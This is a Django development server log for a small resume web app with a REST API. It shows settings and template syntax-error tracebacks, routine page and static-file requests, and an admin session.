Traceback (most recent call last):
  File "./manage.py", line 15, in <module>
    execute_from_command_line(sys.argv)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 381, in execute_from_command_line
    utility.execute()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 325, in execute
    settings.INSTALLED_APPS
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 57, in __getattr__
    self._setup(name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 44, in _setup
    self._wrapped = Settings(settings_module)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 107, in __init__
    mod = importlib.import_module(self.SETTINGS_MODULE)
  File "/usr/lib/python3.5/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 986, in _gcd_import
  File "<frozen importlib._bootstrap>", line 969, in _find_and_load
  File "<frozen importlib._bootstrap>", line 958, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 673, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 661, in exec_module
  File "<frozen importlib._bootstrap_external>", line 767, in get_code
  File "<frozen importlib._bootstrap_external>", line 727, in source_to_code
  File "<frozen importlib._bootstrap>", line 222, in _call_with_frames_removed
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/webresume/settings.py", line 28
    ALLOWED_HOSTS = [162.246.157.223]
                               ^
SyntaxError: invalid syntax
Traceback (most recent call last):
  File "./manage.py", line 15, in <module>
    execute_from_command_line(sys.argv)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 381, in execute_from_command_line
    utility.execute()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 325, in execute
    settings.INSTALLED_APPS
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 57, in __getattr__
    self._setup(name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 44, in _setup
    self._wrapped = Settings(settings_module)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 107, in __init__
    mod = importlib.import_module(self.SETTINGS_MODULE)
  File "/usr/lib/python3.5/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 986, in _gcd_import
  File "<frozen importlib._bootstrap>", line 969, in _find_and_load
  File "<frozen importlib._bootstrap>", line 958, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 673, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 661, in exec_module
  File "<frozen importlib._bootstrap_external>", line 767, in get_code
  File "<frozen importlib._bootstrap_external>", line 727, in source_to_code
  File "<frozen importlib._bootstrap>", line 222, in _call_with_frames_removed
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/webresume/settings.py", line 28
    ALLOWED_HOSTS = [162.246.157.223]
                               ^
SyntaxError: invalid syntax
Traceback (most recent call last):
  File "./manage.py", line 15, in <module>
    execute_from_command_line(sys.argv)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 381, in execute_from_command_line
    utility.execute()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/management/__init__.py", line 325, in execute
    settings.INSTALLED_APPS
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 57, in __getattr__
    self._setup(name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 44, in _setup
    self._wrapped = Settings(settings_module)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/conf/__init__.py", line 107, in __init__
    mod = importlib.import_module(self.SETTINGS_MODULE)
  File "/usr/lib/python3.5/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 986, in _gcd_import
  File "<frozen importlib._bootstrap>", line 969, in _find_and_load
  File "<frozen importlib._bootstrap>", line 958, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 673, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 661, in exec_module
  File "<frozen importlib._bootstrap_external>", line 767, in get_code
  File "<frozen importlib._bootstrap_external>", line 727, in source_to_code
  File "<frozen importlib._bootstrap>", line 222, in _call_with_frames_removed
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/webresume/settings.py", line 28
    ALLOWED_HOSTS = [162.246.157.223]
                               ^
SyntaxError: invalid syntax
[01/Oct/2018 18:47:16] "GET / HTTP/1.1" 200 1137
Not Found: /favicon.ico
[01/Oct/2018 18:47:16] "GET /favicon.ico HTTP/1.1" 404 2550
[01/Oct/2018 18:52:20] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:52:24] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:52:25] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:30] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:31] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:50] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:51] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:51] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:51] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:53:51] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:27] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:28] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:28] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:28] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:28] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:29] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:29] "GET / HTTP/1.1" 200 1137
[01/Oct/2018 18:55:43] "GET /api HTTP/1.1" 301 0
[01/Oct/2018 18:55:43] "GET /api/ HTTP/1.1" 200 5286
[01/Oct/2018 18:55:43] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
[01/Oct/2018 18:55:43] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
[01/Oct/2018 18:55:43] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121200
[01/Oct/2018 18:55:43] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 200 86927
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1735
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 37045
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
[01/Oct/2018 18:55:43] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1262
[01/Oct/2018 18:55:43] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
Not Found: /helloworld.txt
[01/Oct/2018 18:56:24] "GET /helloworld.txt HTTP/1.1" 404 2559
[01/Oct/2018 18:56:36] "GET /hello-world.txt HTTP/1.1" 200 11
Not Found: /image.jpeg
[01/Oct/2018 18:56:52] "GET /image.jpeg HTTP/1.1" 404 2547
[01/Oct/2018 18:56:57] "GET /image.jpg HTTP/1.1" 200 44969
[01/Oct/2018 19:10:40] "GET / HTTP/1.1" 200 1143
Not Found: /api/person/1/
[01/Oct/2018 19:10:40] "GET /api/person/1/ HTTP/1.1" 404 98
[01/Oct/2018 19:10:45] "GET /api/ HTTP/1.1" 200 5286
[01/Oct/2018 19:10:45] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
[01/Oct/2018 19:10:45] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
[01/Oct/2018 19:11:07] "GET /api/person/1 HTTP/1.1" 301 0
Not Found: /api/person/1/
[01/Oct/2018 19:11:07] "GET /api/person/1/ HTTP/1.1" 404 7675
[01/Oct/2018 19:11:07] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028
/home/ubuntu/test/lib/python3.5/site-packages/rest_framework/pagination.py:198: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'api.models.Person'> QuerySet.
  paginator = self.django_paginator_class(queryset, page_size)
[01/Oct/2018 19:13:08] "GET /api/person/ HTTP/1.1" 200 7893
[01/Oct/2018 19:13:21] "GET /api/ HTTP/1.1" 200 5286
[01/Oct/2018 19:13:25] "GET /api/person/ HTTP/1.1" 200 7893
[01/Oct/2018 21:31:54] "GET /hello-world.txt HTTP/1.1" 200 11
[01/Oct/2018 21:32:08] "GET /image.jpg HTTP/1.1" 200 44969
[01/Oct/2018 22:03:21] "GET /api/ HTTP/1.1" 200 5286
[01/Oct/2018 22:03:21] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/jquery-3.3.1.min.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:21] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
[01/Oct/2018 22:03:22] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
[01/Oct/2018 22:03:27] "GET /api/person/ HTTP/1.1" 200 7893
[01/Oct/2018 22:03:27] "GET /static/rest_framework/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0
Bad Request: /api/person/
[01/Oct/2018 22:03:35] "GET /api/person/?format=api HTTP/1.1" 400 7739
Bad Request: /api/person/
[01/Oct/2018 22:03:47] "GET /api/person/?format=api HTTP/1.1" 400 7739
Bad Request: /api/person/
[01/Oct/2018 22:03:50] "GET /api/person/?format=api HTTP/1.1" 400 7739
Bad Request: /api/person/
[01/Oct/2018 22:03:53] "GET /api/person/?format=vnd.api%2Bjson HTTP/1.1" 400 101
[01/Oct/2018 22:04:04] "GET /api/?format=api HTTP/1.1" 200 5352
[01/Oct/2018 22:10:17] "GET / HTTP/1.1" 200 1143
Not Found: /api/person/1/
[01/Oct/2018 22:10:18] "GET /api/person/1/ HTTP/1.1" 404 98
[01/Oct/2018 22:10:29] "GET /admin HTTP/1.1" 301 0
[01/Oct/2018 22:10:29] "GET /admin/ HTTP/1.1" 302 0
[01/Oct/2018 22:10:29] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[01/Oct/2018 22:10:29] "GET /static/admin/css/base.css HTTP/1.1" 200 16225
[01/Oct/2018 22:10:29] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[01/Oct/2018 22:10:29] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17976
[01/Oct/2018 22:10:29] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[01/Oct/2018 22:10:29] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[01/Oct/2018 22:10:29] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[01/Oct/2018 22:10:55] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[01/Oct/2018 22:10:55] "GET /admin/ HTTP/1.1" 200 3698
[01/Oct/2018 22:10:55] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
[01/Oct/2018 22:10:55] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[01/Oct/2018 22:10:55] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[01/Oct/2018 22:10:55] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[01/Oct/2018 22:11:00] "GET /admin/api/person/ HTTP/1.1" 200 3159
[01/Oct/2018 22:11:00] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
[01/Oct/2018 22:11:00] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
[01/Oct/2018 22:11:00] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[01/Oct/2018 22:11:00] "GET /static/admin/js/core.js HTTP/1.1" 200 7134
[01/Oct/2018 22:11:00] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
[01/Oct/2018 22:11:00] "GET /static/admin/js/actions.js HTTP/1.1" 200 6538
[01/Oct/2018 22:11:00] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8972
[01/Oct/2018 22:11:00] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
[01/Oct/2018 22:11:00] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
[01/Oct/2018 22:11:00] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271751
[01/Oct/2018 22:11:00] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
[01/Oct/2018 22:11:02] "GET /admin/api/person/add/ HTTP/1.1" 200 6441
[01/Oct/2018 22:11:02] "GET /static/admin/css/forms.css HTTP/1.1" 200 8505
[01/Oct/2018 22:11:02] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
[01/Oct/2018 22:11:02] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
[01/Oct/2018 22:11:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[01/Oct/2018 22:11:02] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
[01/Oct/2018 22:12:39] "POST /admin/api/person/add/ HTTP/1.1" 302 0
[01/Oct/2018 22:12:39] "GET /admin/api/person/ HTTP/1.1" 200 4516
[01/Oct/2018 22:12:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[01/Oct/2018 22:12:40] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
[01/Oct/2018 22:12:46] "GET /admin/api/person/1/change/ HTTP/1.1" 200 6776
[01/Oct/2018 22:12:46] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[01/Oct/2018 22:12:48] "GET /admin/api/person/1/history/ HTTP/1.1" 200 2286
[01/Oct/2018 22:13:05] "GET / HTTP/1.1" 200 1143
[01/Oct/2018 22:13:06] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:13:43] "GET / HTTP/1.1" 200 1249
[01/Oct/2018 22:13:43] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:13:44] "GET / HTTP/1.1" 200 1249
[01/Oct/2018 22:13:44] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:13:45] "GET / HTTP/1.1" 200 1249
[01/Oct/2018 22:13:45] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:16:14] "GET /image.jpg HTTP/1.1" 200 44969
[01/Oct/2018 22:20:47] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:20:47] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:20:47] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:20:48] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:20:48] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:20:48] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:20:50] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:20:50] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:20:50] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:03] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:03] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:04] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:04] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:04] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:04] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:04] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:04] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:04] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:05] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:05] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:05] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:05] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:05] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:05] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:05] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:05] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:05] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:06] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:06] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:06] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:06] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:06] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:06] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:07] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:07] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:07] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:22:07] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:22:07] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:22:07] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:24:41] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:26:30] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:26:30] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:26:30] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:26:30] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:26:30] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:26:30] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /style.css
[01/Oct/2018 22:26:35] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:32:53] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:32:53] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:32:53] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:32:53] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:32:53] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:32:54] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:32:54] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:32:54] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:32:54] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:32:55] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:32:55] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:32:55] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:33:32] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:33:32] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:33:32] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:33:33] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:33:33] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:33:33] "GET / HTTP/1.1" 200 1240
[01/Oct/2018 22:33:33] "GET /api/person/1/ HTTP/1.1" 200 231
Not Found: /style.css
[01/Oct/2018 22:33:33] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:33:33] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:33:33] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:33:33] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:33:34] "GET / HTTP/1.1" 200 1240
Not Found: /style.css
[01/Oct/2018 22:33:34] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:33:34] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:35:46] "GET / HTTP/1.1" 200 1255
Not Found: /style.css
[01/Oct/2018 22:35:46] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:35:46] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:37:06] "GET / HTTP/1.1" 200 1255
Not Found: /style.css
[01/Oct/2018 22:37:06] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:37:06] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:37:07] "GET / HTTP/1.1" 200 1255
Not Found: /style.css
[01/Oct/2018 22:37:07] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:37:08] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:39:09] "GET / HTTP/1.1" 200 1257
Not Found: /style.css
[01/Oct/2018 22:39:09] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:39:09] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:39:10] "GET / HTTP/1.1" 200 1257
Not Found: /style.css
[01/Oct/2018 22:39:10] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:39:10] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:39:11] "GET / HTTP/1.1" 200 1257
Not Found: /style.css
[01/Oct/2018 22:39:11] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:39:11] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:39:11] "GET / HTTP/1.1" 200 1257
Not Found: /style.css
[01/Oct/2018 22:39:11] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:39:12] "GET /api/person/1/ HTTP/1.1" 200 231
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: "'style.css'"

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/frontend/views.py", line 6, in index
    return render(request, 'index.html', {})
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 144, in get_template
    template, origin = self.find_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 126, in find_template
    template = loader.get_template(name, skip=skip)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 156, in __init__
    self.nodelist = self.compile_nodelist()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 194, in compile_nodelist
    return parser.parse()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 9: ''style.css''. Did you forget to register or load this tag?
[01/Oct/2018 22:41:12] "GET / HTTP/1.1" 500 124999
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 470, in parse
    compile_func = self.tags[command]
KeyError: "'style.css'"

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ubuntu/web-app-ci-cd-with-travis-ci-ZhimaoLin/webresume/frontend/views.py", line 6, in index
    return render(request, 'index.html', {})
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 61, in render_to_string
    template = get_template(template_name, using=using)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loader.py", line 15, in get_template
    return engine.get_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/backends/django.py", line 34, in get_template
    return Template(self.engine.get_template(template_name), self)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 144, in get_template
    template, origin = self.find_template(template_name)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/engine.py", line 126, in find_template
    template = loader.get_template(name, skip=skip)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/loaders/base.py", line 30, in get_template
    contents, origin, origin.template_name, self.engine,
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 156, in __init__
    self.nodelist = self.compile_nodelist()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 194, in compile_nodelist
    return parser.parse()
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 472, in parse
    self.invalid_block_tag(token, command, parse_until)
  File "/home/ubuntu/test/lib/python3.5/site-packages/django/template/base.py", line 534, in invalid_block_tag
    "or load this tag?" % (token.lineno, command)
django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 9: ''style.css''. Did you forget to register or load this tag?
[01/Oct/2018 22:41:13] "GET / HTTP/1.1" 500 124999
[01/Oct/2018 22:44:49] "GET / HTTP/1.1" 200 1255
Not Found: /style.css
[01/Oct/2018 22:44:49] "GET /style.css HTTP/1.1" 404 2544
[01/Oct/2018 22:44:50] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:46:23] "GET / HTTP/1.1" 200 1274
Not Found: /frontend/templates/style.css
[01/Oct/2018 22:46:23] "GET /frontend/templates/style.css HTTP/1.1" 404 2601
[01/Oct/2018 22:46:23] "GET /api/person/1/ HTTP/1.1" 200 231
[01/Oct/2018 22:46:24] "GET / HTTP/1.1" 200 1274
Not Found: /frontend/templates/style.css
[01/Oct/2018 22:46:24] "GET /frontend/templates/style.css HTTP/1.1" 404 2601
[01/Oct/2018 22:46:24] "GET /api/person/1/ HTTP/1.1" 200 231
